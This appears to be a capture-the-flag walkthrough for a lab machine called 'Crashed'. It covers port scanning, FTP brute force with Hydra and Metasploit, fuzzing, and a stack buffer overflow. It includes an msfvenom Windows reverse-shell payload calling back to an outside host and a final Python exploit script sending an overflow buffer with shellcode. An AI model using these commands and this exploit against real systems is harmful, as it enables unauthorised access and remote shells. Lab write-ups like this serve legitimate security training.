# Crashed CTF

**1. Port Scanning**

*   **Unicornscan:**

    ```bash
    sudo unicornscan -ImT 172.24.226.182:1-2000
    ```
*   **Nmap:**

    ```bash
    sudo nmap 172.24.226.182 -p 21 -sV -sC -Pn
    ```

**2. FTP Brute Force**

*   **Metasploit:**

    ```
    scanner/ftp/ftp_login
    set RHOSTS 172.24.226.182
    set USERPASS_FILE ftp.txt
    ```
*   **Hydra:**

    ```bash
    hydra -t 1 -l ftp -P pass.txt -vV 172.24.226.182 ftp
    ```

**3. Enumeration**

* **Get Service Files via FTP**
*   **Strings Analysis:**

    ```bash
    strings super_secure_server.exe | less
    ```
* **Try to Find Running Service Port**

**4. Test for Buffer Overflow**

*   **Fuzzing:**

    ```python
    python -c " print 'SECRET'+'A"*2000" | nc -nvv 172.24.226.182 1337
    ```
* **Overwrite the EIP:** Use Mona to find offset and generate payload accordingly.
* **Find Bad Characters:** Generate a payload to find bad characters and adjust the pattern accordingly.
* **Find the Right Module:** Use Mona to identify the module and the JMP ESP address.
*   **Generate Shellcode:**

    ```bash
    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.3 LPORT=443 -e x86/shikata_ga_nai -f py -v shell -b "\x00"
    ```
* **Exploit:** Update the Python script and initiate the exploit.

```python
# Final exploit script
import socket
# badchars is "\x00\x0a\xad\x25\x26\x2b\x3d"
# Message 0x1009083
shell = "..."  # Generated shellcode
buffer = "SECRET" + "A" * 998 + '\xad\x12\x50\x62' + '\x90' * 16 + shell + '\x90' * (2000 - 998 - 6 - 4 - 16 - len(shell))
payload = "username=" + buffer + "&password=1234"
request = "...HTTP headers..." + payload

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("172.24.226.182", 80))
s.send(request.encode())
print(s.recv(1024))
s.close()
```
